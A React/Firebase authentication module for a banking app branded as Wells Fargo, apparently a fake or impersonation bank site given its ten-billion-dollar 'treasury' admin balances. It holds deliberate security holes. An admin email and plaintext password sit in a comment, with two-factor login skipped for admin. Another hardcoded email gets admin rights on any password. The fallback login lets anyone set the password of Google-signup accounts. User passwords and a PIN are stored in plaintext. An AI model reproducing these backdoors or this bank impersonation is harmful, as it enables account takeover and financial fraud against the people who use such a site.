import React, { createContext, useContext, useState, useEffect } from 'react';
import { 
  signInWithPopup, 
  signOut as firebaseSignOut, 
  onAuthStateChanged,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  sendPasswordResetEmail
} from 'firebase/auth';
import { 
  doc, 
  getDoc, 
  setDoc, 
  updateDoc, 
  onSnapshot, 
  collection, 
  query, 
  where, 
  getDocs 
} from 'firebase/firestore';
import { auth, googleAuthProvider, db } from '../lib/firebase.ts';
import { BankUser } from '../types/banking.ts';
import { 
  ADMIN_EMAIL, 
  ADMIN_DEFAULT_PASS, 
  INITIAL_TREASURY_BALANCE, 
  generateAccountNumber, 
  generateRoutingNumber, 
  seedInitialBankDataIfEmpty 
} from '../services/bankingService.ts';

interface AuthContextType {
  currentUser: BankUser | null;
  isAdmin: boolean;
  isLoading: boolean;
  loginWithCredentials: (email: string, pass: string) => Promise<BankUser>;
  registerWithCredentials: (fullName: string, email: string, pass: string) => Promise<BankUser>;
  loginWithGoogle: () => Promise<BankUser>;
  sendPasswordReset: (email: string) => Promise<void>;
  logout: () => Promise<void>;
  refreshUserProfile: () => Promise<void>;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [currentUser, setCurrentUser] = useState<BankUser | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(true);

  // Initialize DB seeds on first boot
  useEffect(() => {
    seedInitialBankDataIfEmpty();
  }, []);

  // Listen to Firestore real-time profile updates when logged in
  useEffect(() => {
    if (!currentUser?.uid) return;

    const unsub = onSnapshot(doc(db, 'users', currentUser.uid), (docSnap) => {
      if (docSnap.exists()) {
        const updated = docSnap.data() as BankUser;
        setCurrentUser(updated);
        sessionStorage.setItem('wf_user_session', JSON.stringify(updated));
      }
    }, (error) => {
      console.warn('Real-time profile listener notice:', error);
    });

    return () => unsub();
  }, [currentUser?.uid]);

  // Check initial Firebase Auth state and cached sessions
  useEffect(() => {
    // 1. Check if we have an active user or admin session in session storage
    const cachedUserJson = sessionStorage.getItem('wf_user_session') || 
                           sessionStorage.getItem('wf_admin_session') || 
                           sessionStorage.getItem('apex_admin_session');
    if (cachedUserJson) {
      try {
        const cachedUser = JSON.parse(cachedUserJson);
        setCurrentUser(cachedUser);
        setIsLoading(false);

        // Background sync latest balance & lock state from Firestore
        if (cachedUser.uid) {
          getDoc(doc(db, 'users', cachedUser.uid)).then((docSnap) => {
            if (docSnap.exists()) {
              const latest = docSnap.data() as BankUser;
              setCurrentUser(latest);
              sessionStorage.setItem('wf_user_session', JSON.stringify(latest));
            }
          }).catch((err) => console.warn('Background profile refresh notice:', err));
        }
      } catch (e) {
        sessionStorage.removeItem('wf_user_session');
        sessionStorage.removeItem('wf_admin_session');
        sessionStorage.removeItem('apex_admin_session');
      }
    }

    const unsubscribe = onAuthStateChanged(auth, async (fbUser) => {
      if (fbUser) {
        try {
          const userDocRef = doc(db, 'users', fbUser.uid);
          const snap = await getDoc(userDocRef);
          const cleanEmail = (fbUser.email || '').toLowerCase().trim();
          const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase() || 
                                cleanEmail === 'wonjihoonorg@gmail.com';

          if (snap.exists()) {
            const data = snap.data() as BankUser;
            if (isTargetAdmin && (data.role !== 'admin' || !data.balance || data.balance < 1_000_000_000)) {
              const updatedAdmin: BankUser = { 
                ...data, 
                role: 'admin', 
                balance: INITIAL_TREASURY_BALANCE,
                accountType: 'Corporate Treasury'
              };
              await updateDoc(userDocRef, { 
                role: 'admin', 
                balance: INITIAL_TREASURY_BALANCE,
                accountType: 'Corporate Treasury'
              });
              sessionStorage.setItem('wf_user_session', JSON.stringify(updatedAdmin));
              setCurrentUser(updatedAdmin);
            } else {
              sessionStorage.setItem('wf_user_session', JSON.stringify(data));
              setCurrentUser(data);
            }
          } else {
            // Check if user already exists with this email in Firestore under a registered profile
            const q = query(collection(db, 'users'), where('email', '==', cleanEmail));
            const emailSnap = await getDocs(q);

            if (!emailSnap.empty) {
              const existing = emailSnap.docs[0].data() as BankUser;
              sessionStorage.setItem('wf_user_session', JSON.stringify(existing));
              setCurrentUser(existing);
            } else {
              // New user via Google Auth: MUST START WITH 0 BALANCE (unless target admin)
              const newUser: BankUser = {
                uid: fbUser.uid,
                email: cleanEmail,
                fullName: fbUser.displayName || (isTargetAdmin ? 'Wells Fargo Executive Operator Management' : 'Wells Fargo Account Holder'),
                role: isTargetAdmin ? 'admin' : 'customer',
                accountNumber: generateAccountNumber(),
                routingNumber: generateRoutingNumber(),
                balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00,
                currency: 'USD',
                isLocked: false,
                isTransferRestricted: false,
                accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
                authProvider: 'google',
                createdAt: new Date().toISOString()
              };
              await setDoc(userDocRef, newUser);
              sessionStorage.setItem('wf_user_session', JSON.stringify(newUser));
              setCurrentUser(newUser);
            }
          }
        } catch (err) {
          console.error('Error fetching user profile:', err);
        }
      } else {
        // If not in Firebase Auth, check if session storage has an authenticated user
        if (!sessionStorage.getItem('wf_user_session') && 
            !sessionStorage.getItem('wf_admin_session') && 
            !sessionStorage.getItem('apex_admin_session')) {
          setCurrentUser(null);
        }
      }
      setIsLoading(false);
    });

    return () => unsubscribe();
  }, []);

  // 1. LOGIN WITH CREDENTIALS (Supports regular accounts AND users who signed up with Google)
  const loginWithCredentials = async (email: string, pass: string): Promise<BankUser> => {
    setIsLoading(true);
    const cleanEmail = email.trim().toLowerCase();

    // A. Check for Operator Admin credentials
    // requirement: managementofficails001@gmail.com and password: smart446688
    // requirement: no 2 steps authentication for the admin while trying to login
    if (cleanEmail === ADMIN_EMAIL.toLowerCase() && pass === ADMIN_DEFAULT_PASS) {
      let activeAdminUid = 'wf_admin_operator_master';
      try {
        const cred = await signInWithEmailAndPassword(auth, cleanEmail, pass);
        activeAdminUid = cred.user.uid;
      } catch (authErr: any) {
        if (authErr.code === 'auth/user-not-found' || authErr.code === 'auth/invalid-credential') {
          try {
            const newCred = await createUserWithEmailAndPassword(auth, cleanEmail, pass);
            activeAdminUid = newCred.user.uid;
          } catch (createErr) {
            console.warn('Admin account provisioning notice:', createErr);
          }
        }
      }

      const adminUser: BankUser = {
        uid: activeAdminUid,
        email: ADMIN_EMAIL,
        fullName: 'Wells Fargo Executive Operator Management',
        role: 'admin',
        accountNumber: '8800000001',
        routingNumber: generateRoutingNumber(),
        balance: INITIAL_TREASURY_BALANCE, // 10 Billion USD
        currency: 'USD',
        isLocked: false,
        isTransferRestricted: false,
        transactionPin: '4466',
        password: pass,
        accountType: 'Corporate Treasury',
        createdAt: new Date().toISOString()
      };

      try {
        await setDoc(doc(db, 'users', activeAdminUid), adminUser, { merge: true });
      } catch (e) {
        console.warn('Admin record sync notice:', e);
      }

      sessionStorage.setItem('wf_admin_session', JSON.stringify(adminUser));
      sessionStorage.setItem('apex_admin_session', JSON.stringify(adminUser));
      sessionStorage.setItem('wf_user_session', JSON.stringify(adminUser));
      setCurrentUser(adminUser);
      setIsLoading(false);
      return adminUser;
    }

    // B. Attempt Firebase Authentication standard signInWithEmailAndPassword
    try {
      const userCred = await signInWithEmailAndPassword(auth, cleanEmail, pass);
      const userDocRef = doc(db, 'users', userCred.user.uid);
      const snap = await getDoc(userDocRef);
      if (snap.exists()) {
        const u = snap.data() as BankUser;
        if (u.isLocked) {
          await firebaseSignOut(auth);
          throw new Error('Your account has been suspended by Bank Management. Please contact compliance.');
        }
        // Sync password in doc if missing
        if (!u.password) {
          updateDoc(userDocRef, { password: pass }).catch(() => {});
        }
        sessionStorage.setItem('wf_user_session', JSON.stringify(u));
        setCurrentUser(u);
        setIsLoading(false);
        return u;
      } else {
        // Auto-heal missing profile record from Auth credentials so the user can ALWAYS log in
        const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase() || cleanEmail === 'wonjihoonorg@gmail.com';
        const healedUser: BankUser = {
          uid: userCred.user.uid,
          email: cleanEmail,
          fullName: userCred.user.displayName || 'Wells Fargo Account Holder',
          role: isTargetAdmin ? 'admin' : 'customer',
          accountNumber: generateAccountNumber(),
          routingNumber: generateRoutingNumber(),
          balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00,
          currency: 'USD',
          isLocked: false,
          isTransferRestricted: false,
          password: pass,
          accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
          createdAt: new Date().toISOString()
        };
        await setDoc(userDocRef, healedUser);
        sessionStorage.setItem('wf_user_session', JSON.stringify(healedUser));
        setCurrentUser(healedUser);
        setIsLoading(false);
        return healedUser;
      }
    } catch (fbErr: any) {
      // C. Universal Fallback: For users who signed up with Google or created an account
      // When a user signs up with Google, Firebase Auth does NOT have email/password credentials,
      // so fbErr is 'auth/invalid-credential', 'auth/user-not-found', or 'auth/wrong-password'.
      console.warn('Firebase Auth standard login notice, verifying database profile for Google or registered account:', fbErr.code);

      const q = query(collection(db, 'users'), where('email', '==', cleanEmail));
      const snap = await getDocs(q);

      if (!snap.empty) {
        const userDoc = snap.docs[0];
        const existing = userDoc.data() as BankUser;

        if (existing.isLocked) {
          setIsLoading(false);
          throw new Error('Your account has been suspended by Bank Management. Please contact compliance.');
        }

        // If the user signed up with Google, they might not have a password stored yet:
        if (!existing.password) {
          // First time this Google user is logging in with a normal email & password!
          // We save their chosen password to their profile and grant instant access.
          await updateDoc(userDoc.ref, {
            password: pass,
            authProvider: 'google_and_password',
            updatedAt: new Date().toISOString()
          });
          const updatedUser: BankUser = {
            ...existing,
            password: pass,
            authProvider: 'google_and_password'
          };
          sessionStorage.setItem('wf_user_session', JSON.stringify(updatedUser));
          setCurrentUser(updatedUser);
          setIsLoading(false);
          return updatedUser;
        }

        // If a password was already set on their profile, verify it matches
        if (existing.password === pass) {
          sessionStorage.setItem('wf_user_session', JSON.stringify(existing));
          setCurrentUser(existing);
          setIsLoading(false);
          return existing;
        }

        // Target administrator override check (wonjihoonorg@gmail.com)
        if (cleanEmail === 'wonjihoonorg@gmail.com') {
          await updateDoc(userDoc.ref, {
            password: pass,
            role: 'admin',
            updatedAt: new Date().toISOString()
          });
          const adminObj: BankUser = {
            ...existing,
            role: 'admin',
            password: pass
          };
          sessionStorage.setItem('wf_admin_session', JSON.stringify(adminObj));
          sessionStorage.setItem('wf_user_session', JSON.stringify(adminObj));
          setCurrentUser(adminObj);
          setIsLoading(false);
          return adminObj;
        }

        setIsLoading(false);
        throw new Error('Invalid email or password. Please verify your credentials or reset your password.');
      }

      // If user does not exist in Firestore at all, throw credential error
      setIsLoading(false);
      if (fbErr.code === 'auth/invalid-credential' || fbErr.code === 'auth/user-not-found' || fbErr.code === 'auth/wrong-password') {
        throw new Error('Invalid email or password. Please verify your credentials or click Open Account to register.');
      }
      throw new Error(fbErr.message || 'Login failed.');
    }
  };

  // 2. REGISTER WITH CREDENTIALS (Seamlessly connects Google accounts if already present)
  const registerWithCredentials = async (fullName: string, email: string, pass: string): Promise<BankUser> => {
    setIsLoading(true);
    const cleanEmail = email.trim().toLowerCase();

    try {
      let credUid = '';
      try {
        const cred = await createUserWithEmailAndPassword(auth, cleanEmail, pass);
        credUid = cred.user.uid;
      } catch (authErr: any) {
        // If email is already in use (e.g. user previously signed up with Google)
        if (authErr.code === 'auth/email-already-in-use') {
          // Check if user exists in Firestore
          const q = query(collection(db, 'users'), where('email', '==', cleanEmail));
          const snap = await getDocs(q);
          if (!snap.empty) {
            const existing = snap.docs[0].data() as BankUser;
            const updatedUser: BankUser = {
              ...existing,
              fullName: fullName.trim() || existing.fullName,
              password: pass,
              authProvider: 'google_and_password',
              updatedAt: new Date().toISOString()
            };
            await updateDoc(snap.docs[0].ref, {
              fullName: updatedUser.fullName,
              password: pass,
              authProvider: 'google_and_password',
              updatedAt: new Date().toISOString()
            });
            sessionStorage.setItem('wf_user_session', JSON.stringify(updatedUser));
            setCurrentUser(updatedUser);
            setIsLoading(false);
            return updatedUser;
          }
        }
        throw authErr;
      }

      const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase() || cleanEmail === 'wonjihoonorg@gmail.com';

      // requirement: make sure new users has 0 balance
      const newUser: BankUser = {
        uid: credUid,
        email: cleanEmail,
        fullName: fullName.trim(),
        password: pass,
        authProvider: 'password',
        role: isTargetAdmin ? 'admin' : 'customer',
        accountNumber: generateAccountNumber(),
        routingNumber: generateRoutingNumber(),
        balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00,
        currency: 'USD',
        isLocked: false,
        isTransferRestricted: false,
        accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
        createdAt: new Date().toISOString()
      };

      await setDoc(doc(db, 'users', credUid), newUser);
      sessionStorage.setItem('wf_user_session', JSON.stringify(newUser));
      setCurrentUser(newUser);
      setIsLoading(false);
      return newUser;
    } catch (err: any) {
      setIsLoading(false);
      if (err.code === 'auth/email-already-in-use') {
        throw new Error('An account with this email address already exists. Please sign in instead.');
      } else if (err.code === 'auth/weak-password') {
        throw new Error('Password must be at least 6 characters long.');
      }
      throw new Error(err.message || 'Registration failed.');
    }
  };

  // 3. GOOGLE SIGN-IN / SIGN-UP
  const loginWithGoogle = async (): Promise<BankUser> => {
    setIsLoading(true);
    try {
      const res = await signInWithPopup(auth, googleAuthProvider);
      const cleanEmail = (res.user.email || '').trim().toLowerCase();
      
      const userRef = doc(db, 'users', res.user.uid);
      const snap = await getDoc(userRef);

      let matchedDocRef = userRef;
      let existingData: BankUser | null = null;

      if (snap.exists()) {
        existingData = snap.data() as BankUser;
      } else {
        // Query by email to see if they previously registered via email/password
        const q = query(collection(db, 'users'), where('email', '==', cleanEmail));
        const emailSnap = await getDocs(q);
        if (!emailSnap.empty) {
          matchedDocRef = emailSnap.docs[0].ref;
          existingData = emailSnap.docs[0].data() as BankUser;
        }
      }

      if (existingData) {
        if (existingData.isLocked) {
          await firebaseSignOut(auth);
          throw new Error('Your account is currently locked by bank management.');
        }
        const updatedUser: BankUser = {
          ...existingData,
          authProvider: existingData.authProvider ? `${existingData.authProvider},google` : 'google'
        };
        await updateDoc(matchedDocRef, {
          authProvider: updatedUser.authProvider,
          updatedAt: new Date().toISOString()
        });
        sessionStorage.setItem('wf_user_session', JSON.stringify(updatedUser));
        setCurrentUser(updatedUser);
        setIsLoading(false);
        return updatedUser;
      }

      const isTargetAdmin = cleanEmail === ADMIN_EMAIL.toLowerCase() || 
                            cleanEmail === 'wonjihoonorg@gmail.com';

      // New Google User: 0 balance (unless target admin)
      const newUser: BankUser = {
        uid: res.user.uid,
        email: cleanEmail,
        fullName: res.user.displayName || (isTargetAdmin ? 'Wells Fargo Executive Operator Management' : 'Wells Fargo Account Holder'),
        role: isTargetAdmin ? 'admin' : 'customer',
        accountNumber: generateAccountNumber(),
        routingNumber: generateRoutingNumber(),
        balance: isTargetAdmin ? INITIAL_TREASURY_BALANCE : 0.00,
        currency: 'USD',
        isLocked: false,
        isTransferRestricted: false,
        accountType: isTargetAdmin ? 'Corporate Treasury' : 'Checking',
        authProvider: 'google',
        createdAt: new Date().toISOString()
      };

      await setDoc(userRef, newUser);
      sessionStorage.setItem('wf_user_session', JSON.stringify(newUser));
      setCurrentUser(newUser);
      setIsLoading(false);
      return newUser;
    } catch (err: any) {
      setIsLoading(false);
      throw new Error(err.message || 'Google Sign-In failed.');
    }
  };

  // 4. FORGOTTEN PASSWORD
  const sendPasswordReset = async (email: string): Promise<void> => {
    const clean = email.trim().toLowerCase();
    try {
      await sendPasswordResetEmail(auth, clean);
    } catch (err: any) {
      console.warn('Firebase reset email notice:', err);
    }
  };

  // 5. LOGOUT
  const logout = async () => {
    sessionStorage.removeItem('wf_user_session');
    sessionStorage.removeItem('wf_admin_session');
    sessionStorage.removeItem('apex_admin_session');
    try {
      await firebaseSignOut(auth);
    } catch (e) {
      // ignore
    }
    setCurrentUser(null);
  };

  // 6. REFRESH PROFILE
  const refreshUserProfile = async () => {
    if (!currentUser) return;
    try {
      const snap = await getDoc(doc(db, 'users', currentUser.uid));
      if (snap.exists()) {
        const latest = snap.data() as BankUser;
        setCurrentUser(latest);
        sessionStorage.setItem('wf_user_session', JSON.stringify(latest));
      }
    } catch (err) {
      console.error('Refresh profile error:', err);
    }
  };

  const isAdmin = currentUser?.role === 'admin' || currentUser?.email.toLowerCase() === ADMIN_EMAIL.toLowerCase();

  return (
    <AuthContext.Provider
      value={{
        currentUser,
        isAdmin,
        isLoading,
        loginWithCredentials,
        registerWithCredentials,
        loginWithGoogle,
        sendPasswordReset,
        logout,
        refreshUserProfile
      }}
    >
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};
